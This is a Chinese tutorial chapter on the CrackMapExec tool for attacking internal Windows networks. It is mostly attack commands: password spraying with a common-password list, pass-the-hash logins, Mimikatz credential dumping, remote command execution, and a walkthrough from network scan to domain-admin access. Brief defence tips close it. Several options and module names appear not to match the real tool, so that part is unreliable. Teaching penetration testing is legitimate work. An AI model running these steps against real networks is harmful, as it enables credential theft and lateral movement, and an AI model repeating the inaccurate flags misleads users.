# 第二十五章：CrackMapExec - 内网渗透工具

## 25.1 CrackMapExec 简介

### 什么是 CrackMapExec？

想象一下，你是一名特种兵，进入了一个大型军事基地。基地里有很多建筑物，每个建筑物都有不同的入口和守卫。你需要快速了解整个基地的布局，找到所有的入口，测试哪些入口可以进入，然后制定攻击计划。

**CrackMapExec**就是这样一个"基地侦察工具"——它可以快速扫描内网中的所有Windows主机，测试各种认证方式，执行命令，提取凭证，就像一个全能的渗透测试助手。

简单来说，CrackMapExec是一个**内网渗透的瑞士军刀**，它整合了多种功能：
- SMB/WinRM探测和扫描
- 密码和哈希爆破
- 命令执行
- 凭证提取
- 横向移动

### CrackMapExec 能做什么？

| 功能 | 说明 | 通俗理解 |
|------|------|----------|
| SMB探测 | 扫描内网Windows主机 | 侦察基地里的所有建筑 |
| 密码爆破 | 测试用户名和密码组合 | 尝试各种钥匙开门 |
| 哈希利用 | 使用NTLM哈希认证（Pass-the-Hash） | 用钥匙复印件开门 |
| 命令执行 | 在目标主机上执行命令 | 在对方地盘上操作 |
| 凭证提取 | 提取Windows凭证 | 偷走对方的钥匙 |
| 横向移动 | 在主机之间移动 | 从一栋建筑到另一栋 |
| 漏洞利用 | 利用已知漏洞 | 发现并利用防守漏洞 |

### 为什么CrackMapExec如此强大？

CrackMapExec之所以强大，是因为它：

1. **功能整合**：将多个工具的功能整合到一个工具中
2. **自动化**：可以自动扫描整个内网，无需手动操作
3. **多协议支持**：支持SMB、WinRM、LDAP等多种协议
4. **模块化**：可以通过模块扩展功能
5. **效率高**：快速扫描和测试，节省时间

---

## 25.2 安装教程

### 系统环境要求

CrackMapExec是一个Python工具，需要：
- Python 3.6+
- 支持Linux（推荐Kali Linux）

### 安装方法

**方法一：使用pip安装（推荐）**

```bash
pip3 install crackmapexec
```

**方法二：从GitHub克隆最新版本**

```bash
git clone https://github.com/Porchetta-Industries/CrackMapExec.git
cd CrackMapExec
python3 setup.py install
```

**方法三：使用apt安装（Kali Linux）**

```bash
sudo apt update
sudo apt install crackmapexec
```

### 验证安装

```bash
cme -h
```

如果显示帮助信息，说明安装成功。

---

## 25.3 SMB探测详解

### 扫描整个子网

```bash
cme smb 192.168.1.0/24
```

这个命令会扫描整个192.168.1.0/24子网，显示每个主机的SMB信息。

### 扫描单个主机

```bash
cme smb 192.168.1.100
```

### 扫描多个主机

```bash
cme smb 192.168.1.100 192.168.1.101 192.168.1.102
```

### 扫描结果说明

扫描结果包含以下信息：

| 字段 | 说明 | 示例 |
|------|------|------|
| IP | 主机IP地址 | 192.168.1.100 |
| Hostname | 主机名 | WIN-PC01 |
| Domain | 域名 | CORP.LOCAL |
| OS | 操作系统 | Windows 10 Pro |
| Signing | SMB签名状态 | True/False |
| NTLM | NTLM版本 | NTLMv2 |
| SMBv1 | SMBv1支持 | True/False |

### 过滤结果

可以使用`--filter`参数过滤结果：

```bash
# 只显示有SMB签名的主机
cme smb 192.168.1.0/24 --filter "signing=True"

# 只显示Windows 10主机
cme smb 192.168.1.0/24 --filter "os=Windows 10"
```

---

## 25.4 密码认证详解

### 密码登录

```bash
cme smb 192.168.1.100 -u admin -p password
```

| 参数 | 说明 |
|------|------|
| -u | 用户名 |
| -p | 密码 |

### 哈希登录（Pass-the-Hash）

```bash
cme smb 192.168.1.100 -u admin -H a1b2c3d4e5f6000000000000a1b2c3d4
```

| 参数 | 说明 |
|------|------|
| -H | NTLM哈希（格式：LM:NTLM或纯NTLM） |

### 使用用户名列表

```bash
cme smb 192.168.1.100 -U users.txt -p password
```

| 参数 | 说明 |
|------|------|
| -U | 用户名列表文件 |

### 使用密码列表

```bash
cme smb 192.168.1.100 -u admin -P passwords.txt
```

| 参数 | 说明 |
|------|------|
| -P | 密码列表文件 |

### 使用哈希列表

```bash
cme smb 192.168.1.100 -u admin -H hashes.txt
```

---

## 25.5 命令执行详解

### 执行CMD命令

```bash
cme smb 192.168.1.100 -u admin -p password -x 'whoami'
```

| 参数 | 说明 |
|------|------|
| -x | 执行CMD命令 |

### 执行PowerShell命令

```bash
cme smb 192.168.1.100 -u admin -p password -X 'Get-Process'
```

| 参数 | 说明 |
|------|------|
| -X | 执行PowerShell命令 |

### 执行命令到多个主机

```bash
cme smb 192.168.1.0/24 -u admin -p password -x 'whoami'
```

### 执行本地脚本

```bash
# 创建脚本文件
cat > script.ps1 << EOF
Get-Process | Select-Object Name, ID
EOF

# 执行脚本
cme smb 192.168.1.100 -u admin -p password -X 'IEX (Get-Content script.ps1 -Raw)'
```

---

## 25.6 Mimikatz集成详解

### 提取密码

```bash
cme smb 192.168.1.100 -u admin -p password -M mimikatz
```

| 参数 | 说明 |
|------|------|
| -M | 指定模块名称 |

### Mimikatz模块参数

```bash
# 指定提取类型
cme smb 192.168.1.100 -u admin -p password -M mimikatz -o COMMAND='sekurlsa::logonpasswords'
```

| 参数 | 说明 | 示例 |
|------|------|------|
| -o | 设置模块参数 | `-o COMMAND='sekurlsa::logonpasswords'` |

### 常用Mimikatz命令

| 命令 | 说明 | 用途 |
|------|------|------|
| sekurlsa::logonpasswords | 提取登录密码 | 获取用户凭证 |
| sekurlsa::pth | Pass-the-Hash | 使用哈希认证 |
| kerberos::golden | 创建黄金票据 | 伪造TGT |
| lsadump::sam | 提取SAM数据库 | 获取本地密码哈希 |
| lsadump::lsa | 提取LSA数据 | 获取域信息 |

---

## 25.7 模块系统详解

### 查看可用模块

```bash
cme smb --list-modules
```

### 常用模块

| 模块名称 | 说明 | 用途 |
|----------|------|------|
| mimikatz | Mimikatz集成 | 提取凭证 |
| bloodhound | BloodHound数据采集 | 域分析 |
| enum_adjacent | 枚举相邻主机 | 内网侦察 |
| get_group_policy | 获取组策略 | 信息收集 |
| get_sessions | 获取登录会话 | 横向移动 |
| keylogger | 键盘记录器 | 捕获密码 |
| psexec | PsExec功能 | 远程执行 |
| sam_dump | SAM数据库导出 | 获取密码哈希 |
| smbexec | SMBExec功能 | 远程执行 |
| wmi | WMI执行 | 远程执行 |

### 使用模块

```bash
cme smb 192.168.1.100 -u admin -p password -M bloodhound
```

### 模块参数

```bash
cme smb 192.168.1.100 -u admin -p password -M bloodhound -o COLLECTIONMETHOD='All'
```

---

## 25.8 WinRM模块详解

### WinRM探测

```bash
cme winrm 192.168.1.0/24
```

### WinRM密码认证

```bash
cme winrm 192.168.1.100 -u admin -p password
```

### WinRM哈希认证

```bash
cme winrm 192.168.1.100 -u admin -H a1b2c3d4e5f6000000000000a1b2c3d4
```

### WinRM命令执行

```bash
# 执行CMD命令
cme winrm 192.168.1.100 -u admin -p password -x 'whoami'

# 执行PowerShell命令
cme winrm 192.168.1.100 -u admin -p password -X 'Get-Process'
```

---

## 25.9 LDAP模块详解

### LDAP探测

```bash
cme ldap 192.168.1.100
```

### LDAP匿名绑定

```bash
cme ldap 192.168.1.100 --bind-type anonymous
```

### LDAP枚举

```bash
# 枚举用户
cme ldap 192.168.1.100 -u admin -p password --user-enum

# 枚举组
cme ldap 192.168.1.100 -u admin -p password --group-enum

# 枚举计算机
cme ldap 192.168.1.100 -u admin -p password --computer-enum
```

### LDAP查询

```bash
cme ldap 192.168.1.100 -u admin -p password --query '(objectClass=user)'
```

---

## 25.10 实战案例：内网渗透

### 场景说明

假设你已经进入了一个内网环境，现在需要快速扫描内网主机，获取凭证，进行横向移动。

### 步骤

**步骤1：扫描内网SMB主机**

```bash
cme smb 192.168.1.0/24
```

记录下所有存活的Windows主机。

**步骤2：测试常见密码**

```bash
# 创建密码列表
cat > passwords.txt << EOF
password
Password123
admin
Admin123
P@ssw0rd
EOF

# 测试密码
cme smb 192.168.1.0/24 -u administrator -P passwords.txt
```

**步骤3：使用哈希登录**

假设你已经获取了一个NTLM哈希：

```bash
cme smb 192.168.1.100 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

**步骤4：提取凭证**

```bash
cme smb 192.168.1.100 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c -M mimikatz
```

**步骤5：横向移动到其他主机**

使用提取到的凭证连接其他主机：

```bash
cme smb 192.168.1.101 -u administrator -H <新获取的哈希>
```

**步骤6：收集域信息**

```bash
# 使用BloodHound模块采集数据
cme smb 192.168.1.100 -u administrator -H <哈希> -M bloodhound

# 枚举域用户
cme ldap 192.168.1.100 -u administrator -H <哈希> --user-enum
```

**步骤7：获取域管理员权限**

根据收集到的信息，找到域管理员的主机：

```bash
cme smb 192.168.1.102 -u administrator -H <哈希> -x 'net group "Domain Admins" /domain'
```

---

## 25.11 防御方法

### 强化认证

1. **使用强密码**：防止密码被暴力破解
2. **启用SMB签名**：防止SMB中继攻击
3. **限制管理员权限**：避免过度授权

### 监控日志

1. **监控SMB连接**：检测异常的SMB访问
2. **监控密码尝试**：检测暴力破解攻击
3. **监控命令执行**：检测异常的命令执行

### 安全配置

1. **禁用SMBv1**：SMBv1存在安全漏洞
2. **限制WinRM访问**：只允许授权IP访问
3. **更新系统补丁**：及时修复漏洞

### 网络隔离

1. **分段网络**：将内网分成多个网段
2. **限制横向移动**：防止攻击者在主机之间移动
3. **防火墙规则**：限制不必要的端口访问

---

## 25.12 常见问题与解决方案

### 问题1：扫描结果为空

**现象**：扫描后没有显示任何主机

**原因**：网络不可达、防火墙阻止、主机未开启SMB服务

**解决方案**：
- 检查网络连通性
- 确认目标主机开启了SMB服务
- 检查防火墙规则

### 问题2：认证失败

**现象**：使用正确的密码但认证失败

**原因**：账户锁定、权限不足、SMB签名要求

**解决方案**：
- 确认账户未被锁定
- 确认用户具有SMB访问权限
- 使用`--no-signing-check`参数（不推荐）

### 问题3：命令执行失败

**现象**：执行命令后没有返回结果

**原因**：权限不足、命令被阻止、网络延迟

**解决方案**：
- 使用管理员权限执行
- 尝试不同的命令
- 增加超时时间

### 问题4：模块加载失败

**现象**：使用模块时显示错误

**原因**：模块依赖缺失、模块版本不兼容

**解决方案**：
- 安装模块依赖
- 更新CrackMapExec到最新版本

### 问题5：哈希格式错误

**现象**：使用哈希登录时显示错误

**原因**：哈希格式不正确

**解决方案**：
- 确认哈希格式（LM:NTLM或纯NTLM）
- 使用正确的哈希格式

---

## 总结

本章详细介绍了CrackMapExec的使用：

1. **什么是CrackMapExec**：内网渗透的瑞士军刀，整合多种功能
2. **安装配置**：pip安装和源码安装
3. **SMB探测**：扫描内网主机，获取SMB信息
4. **密码认证**：密码登录、哈希登录、用户名/密码列表
5. **命令执行**：CMD命令和PowerShell命令执行
6. **Mimikatz集成**：提取凭证、Pass-the-Hash、黄金票据
7. **模块系统**：查看和使用各种模块
8. **WinRM模块**：WinRM探测和命令执行
9. **LDAP模块**：LDAP枚举和查询
10. **实战案例**：从扫描内网到获取域管理员权限的完整流程
11. **防御方法**：强化认证、监控日志、安全配置、网络隔离
12. **常见问题**：扫描结果为空、认证失败、命令执行失败、模块加载失败、哈希格式错误的解决方案

CrackMapExec是内网渗透的高效工具，掌握它可以大大提高渗透测试的效率。

下一章我们将学习Impacket——Python网络工具包！